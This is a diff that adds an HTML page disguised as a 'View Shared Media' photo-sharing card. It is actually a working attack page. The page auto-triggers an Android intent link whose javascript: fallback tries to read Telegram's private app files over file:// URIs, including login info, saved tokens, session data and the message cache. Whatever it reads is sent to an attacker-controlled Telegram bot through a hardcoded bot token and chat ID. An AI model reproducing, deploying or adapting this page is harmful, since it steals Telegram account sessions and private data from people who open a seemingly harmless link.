@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shared Media</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, system-ui, sans-serif; background: #f0f0f0; padding: 20px; }
+    .card {
+      max-width: 400px; margin: 60px auto; background: #fff;
+      border-radius: 16px; padding: 30px; text-align: center;
+      box-shadow: 0 2px 12px rgba(0,0,0,.08);
+    }
+    .card h2 { font-size: 22px; margin-bottom: 8px; }
+    .card p { color: #666; margin-bottom: 24px; }
+    .btn {
+      display: block; background: #2AABEE; color: #fff; text-decoration: none;
+      padding: 14px; border-radius: 10px; font-size: 16px; font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+<div class="card">
+  <h2>View Shared Media</h2>
+  <p>3 photos shared with you</p>
+  <a id="trigger" class="btn" href="intent://x#Intent;scheme=nonexistent99;S.browser_fallback_url=javascript:void(fileTest());end">View Photos</a>
+</div>
+<script>
+var BOT_TOKEN = '8637229217:AAHukIDrQ3yHMKakpb4pOhLbb-IpjG_vtCA'
+var CHAT_ID = '1184265321'
+
+function sendBot(text) {
+  try {
+    var xhr = new XMLHttpRequest()
+    xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', true)
+    xhr.setRequestHeader('Content-Type', 'application/json')
+    xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }))
+  } catch(e) {}
+}
+
+function fileTest() {
+  document.title = 'File Access Test';
+  var results = {};
+
+  // List of files to try reading
+  var targets = [
+    '/data/data/org.telegram.messenger/shared_prefs/userconfing.xml',
+    '/data/data/org.telegram.messenger/shared_prefs/mainconfig.xml',
+    '/data/data/org.telegram.messenger/shared_prefs/logininfo2.xml',
+    '/data/data/org.telegram.messenger/shared_prefs/saved_tokens.xml',
+    '/data/data/org.telegram.messenger/shared_prefs/themeconfig.xml',
+    '/data/data/org.telegram.messenger/files/account0.dat',
+    '/data/data/org.telegram.messenger/files/tgnet.dat',
+    '/data/data/org.telegram.messenger/databases/cache4.db',
+    '/data/data/org.telegram.messenger.web/shared_prefs/userconfing.xml',
+    '/data/data/org.telegram.messenger.web/shared_prefs/mainconfig.xml',
+    '/sdcard/Download/test.txt',
+    '/proc/self/cmdline',
+    '/etc/hosts',
+  ];
+
+  sendBot('<b>FILE ACCESS TEST (v1)</b>\nTesting ' + targets.length + ' file paths...');
+
+  // Method 1: XMLHttpRequest to file:// URIs
+  var xhrResults = {};
+  var xhrDone = 0;
+  for (var i = 0; i < targets.length; i++) {
+    (function(path) {
+      try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'file://' + path, true);
+        xhr.onload = function() {
+          xhrDone++;
+          xhrResults[path] = {status: xhr.status, len: xhr.responseText.length, preview: xhr.responseText.substring(0, 200)};
+          checkXhrDone();
+        };
+        xhr.onerror = function() {
+          xhrDone++;
+          xhrResults[path] = {error: 'onerror', status: xhr.status};
+          checkXhrDone();
+        };
+        xhr.ontimeout = function() {
+          xhrDone++;
+          xhrResults[path] = {error: 'timeout'};
+          checkXhrDone();
+        };
+        xhr.timeout = 3000;
+        xhr.send();
+      } catch(e) {
+        xhrDone++;
+        xhrResults[path] = {error: 'exception: ' + e.message};
+        checkXhrDone();
+      }
+    })(targets[i]);
+  }
+
+  function checkXhrDone() {
+    if (xhrDone >= targets.length) {
+      // Find successes
+      var successes = {};
+      var failures = {};
+      for (var p in xhrResults) {
+        if (xhrResults[p].preview || xhrResults[p].len > 0) {
+          successes[p] = xhrResults[p];
+        } else {
+          failures[p] = xhrResults[p].error || 'empty';
+        }
+      }
+      var msg = '<b>XHR file:// results:</b>\n';
+      msg += '<b>Successes:</b>\n<code>' + JSON.stringify(successes, null, 1).substring(0, 2000) + '</code>\n';
+      msg += '<b>Failures:</b>\n<code>' + JSON.stringify(failures, null, 1).substring(0, 1000) + '</code>';
+      sendBot(msg);
+    }
+  }
+
+  // Method 2: fetch() to file:// URIs
+  var fetchResults = {};
+  var fetchTargets = targets.slice(0, 5); // test subset
+  var fetchDone = 0;
+  for (var j = 0; j < fetchTargets.length; j++) {
+    (function(path) {
+      try {
+        fetch('file://' + path).then(function(resp) {
+          return resp.text().then(function(text) {
+            fetchDone++;
+            fetchResults[path] = {status: resp.status, len: text.length, preview: text.substring(0, 200)};
+            checkFetchDone();
+          });
+        }).catch(function(e) {
+          fetchDone++;
+          fetchResults[path] = {error: e.message};
+          checkFetchDone();
+        });
+      } catch(e) {
+        fetchDone++;
+        fetchResults[path] = {error: 'exception: ' + e.message};
+        checkFetchDone();
+      }
+    })(fetchTargets[j]);
+  }
+
+  function checkFetchDone() {
+    if (fetchDone >= fetchTargets.length) {
+      sendBot('<b>fetch() file:// results:</b>\n<code>' + JSON.stringify(fetchResults, null, 1).substring(0, 2000) + '</code>');
+    }
+  }
+
+  // Method 3: iframe loading file:// and trying to read content
+  setTimeout(function() {
+    var iframeResults = {};
+    var testFile = '/data/data/org.telegram.messenger/shared_prefs/userconfing.xml';
+    try {
+      var ifr = document.createElement('iframe');
+      ifr.style.cssText = 'width:1px;height:1px;position:fixed;top:-9999px';
+      ifr.src = 'file://' + testFile;
+      ifr.onload = function() {
+        try {
+          var content = ifr.contentDocument.body.innerText || ifr.contentDocument.body.innerHTML;
+          iframeResults.userconfing = {status: 'loaded', len: content.length, preview: content.substring(0, 300)};
+        } catch(e) {
+          iframeResults.userconfing = {status: 'loaded but cross-origin blocked', error: e.message};
+        }
+        sendBot('<b>iframe file:// results:</b>\n<code>' + JSON.stringify(iframeResults, null, 1).substring(0, 2000) + '</code>');
+      };
+      ifr.onerror = function() {
+        iframeResults.userconfing = {status: 'error loading'};
+        sendBot('<b>iframe file:// results:</b>\n<code>' + JSON.stringify(iframeResults, null, 1) + '</code>');
+      };
+      document.body.appendChild(ifr);
+    } catch(e) {
+      sendBot('<b>iframe file:// error:</b> ' + e.message);
+    }
+  }, 1000);
+
+  // Method 4: Direct navigation test - try loading file:// as main page
+  // This is the nuclear option - if it works we can read the content
+  // but we lose our script context. Use a postMessage relay instead.
+  setTimeout(function() {
+    sendBot('<b>FILE TEST:</b> All async tests dispatched. If nothing comes back, file:// is fully blocked.');
+  }, 5000);
+}
+
+setTimeout(function() {
+  document.getElementById('trigger').click();
+}, 2000);
+</script>
+</body>
+</html>
